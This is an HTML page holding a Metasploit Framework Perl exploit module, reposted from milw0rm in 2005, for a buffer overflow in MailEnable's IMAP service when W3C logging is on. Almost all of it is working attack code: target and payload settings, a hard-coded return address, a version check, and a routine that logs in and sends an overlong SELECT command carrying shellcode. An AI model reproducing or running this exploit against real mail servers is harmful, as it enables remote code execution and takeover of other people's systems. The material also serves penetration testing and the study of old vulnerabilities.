<html>
<head>
<title>MailEnable 1.54 Pro Universal IMAPD W3C Logging BoF Exploit</title>
<pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mailenable_imap_w3c;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  };

my $info = {
	'Name'    =&gt; 'MailEnable IMAPD W3C Logging Buffer Overflow',
	'Version'  =&gt; '$Revision: 1.1 $',
	'Authors' =&gt; [ 'y0 &lt;y0 [at] w00t-shell.net&gt;', ],
	'Arch'    =&gt; [ 'x86' ],
	'OS'      =&gt; [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'    =&gt; 1,
	'AutoOpts'  =&gt;
	  {
		'EXITFUNC'  =&gt; 'thread',
	  },
	'UserOpts'  =&gt;
	  {
		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
		'RPORT' =&gt; [1, 'PORT', 'The target port', 143],
		'USER'  =&gt; [1, 'DATA', 'IMAP Username'],
		'PASS'  =&gt; [1, 'DATA', 'IMAP Password'],

	  },
	'Payload' =&gt;
	  {
		'Prepend'   =&gt; &quot;\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff&quot;,
		'Space'     =&gt; 600,
		'BadChars'  =&gt; &quot;\x00\x0a\x0d\x20&quot;,
		'Keys'      =&gt; ['+ws2ord'],
	  },
	'Description'  =&gt; Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in the W3C logging
	functionality of the MailEnable IMAPD service. Logging is not
	enabled by default and this exploit requires a valid username
	and password to exploit the flaw. MailEnable Professional version
	1.6 and prior and MailEnable Enterprise version 1.1 and prior are
	affected.    
}),
	'Refs'  =&gt;
	  [
		['BID', 15006],
	  ],
	'Targets' =&gt;
	  [
		['MailEnable 1.54 Pro Universal', 0x1001c019], #MEAISP.DLL
	  ],
	'Keys' =&gt; ['imap'],
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);

	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');

	my $s = Msf::Socket::Tcp-&gt;new
	  (
		'PeerAddr'  =&gt; $target_host,
		'PeerPort'  =&gt; 25,
		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
	  );

	if ($s-&gt;IsError) {
		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
		return $self-&gt;CheckCode('Connect');
	}

	$s-&gt;Send(&quot;QUIT\r\n&quot;);
	my $res = $s-&gt;Recv(-1, 20);
	$s-&gt;Close();

	if ($res !~ /MailEnable Service, Version: 0-1\.54/) {
		$self-&gt;PrintLine(&quot;[*] This server does not appear to be vulnerable.&quot;);
		return $self-&gt;CheckCode('Safe');
	}

	$self-&gt;PrintLine(&quot;[*] Vulnerable installation detected :-)&quot;);
	return $self-&gt;CheckCode('Detected');
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self-&gt;GetVar('RHOST');
	my $targetPort  = $self-&gt;GetVar('RPORT');
	my $targetIndex = $self-&gt;GetVar('TARGET');
	my $user        = $self-&gt;GetVar('USER');
	my $pass        = $self-&gt;GetVar('PASS');
	my $encodedPayload = $self-&gt;GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload-&gt;Payload;
	my $target = $self-&gt;Targets-&gt;[$targetIndex];

	my $sock = Msf::Socket::Tcp-&gt;new(
		'PeerAddr' =&gt; $targetHost,
		'PeerPort' =&gt; $targetPort,
	  );
	if($sock-&gt;IsError) {
		$self-&gt;PrintLine('Error creating socket: ' . $sock-&gt;GetError);
		return;
	}

	my $resp = $sock-&gt;Recv(-1);
	chomp($resp);
	$self-&gt;PrintLine('[*] Got Banner: ' . $resp);

	my $sploit = &quot;a01 LOGIN $user $pass\r\n&quot;;
	$sock-&gt;Send($sploit);
	my $resp = $sock-&gt;Recv(-1);
	if($sock-&gt;IsError) {
		$self-&gt;PrintLine('Socket error: ' . $sock-&gt;GetError);
		return;
	}
	if($resp !~ /^a01 BAD LOGIN-/) {
		$self-&gt;PrintLine('Login error: ' . $resp);
		return;
	}
	$self-&gt;PrintLine('[*] Logged in, sending overflow');

	my $splat = Pex::Text::AlphaNumText(6196);
	$sploit =
	  &quot;a01 SELECT &quot;. $splat.
	  &quot;\xeb\x06&quot;.  pack('V', $target-&gt;[1]).
	  $shellcode. &quot;\r\n&quot;;

	$sock-&gt;Send($sploit);

	my $resp = $sock-&gt;Recv(-1);
	if(length($resp)) {
		$self-&gt;PrintLine('[*] Got response, bad: ' . $resp);
	}

	return;

}

1;

# milw0rm.com [2005-11-20]
</pre>
</html>

